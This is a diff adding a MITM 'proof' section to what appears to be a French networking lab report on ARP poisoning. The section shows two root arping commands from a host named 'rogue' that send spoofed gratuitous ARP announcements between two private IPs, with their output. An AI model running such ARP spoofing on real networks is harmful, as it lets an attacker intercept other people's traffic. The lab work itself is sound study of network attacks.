@@ -340,3 +340,21 @@ VPCS> arp
 📁 [p4_poisoning.pcap](p4_poisoning.pcapng)
 
 #### B. MITM
+
+🌞 Proof !
+```bash
+[root@rogue ~]# sudo arping -c 1 -U -s 10.1.1.45 -I enp0s8 10.1.1.247
+ARPING 10.1.1.247 de 10.1.1.45 enp0s8
+1 sondes envoyées (1 diffusion(s))
+0 réponse(s) reçue(s)
+
+```
+
+```bash 
+[root@rogue ~]# sudo arping -c 1 -U -s 10.1.1.247 -I enp0s8 10.1.1.45
+ARPING 10.1.1.45 de 10.1.1.247 enp0s8
+1 sondes envoyées (1 diffusion(s))
+0 réponse(s) reçue(s)
+```
+
+📁 p4_mitm.pcap
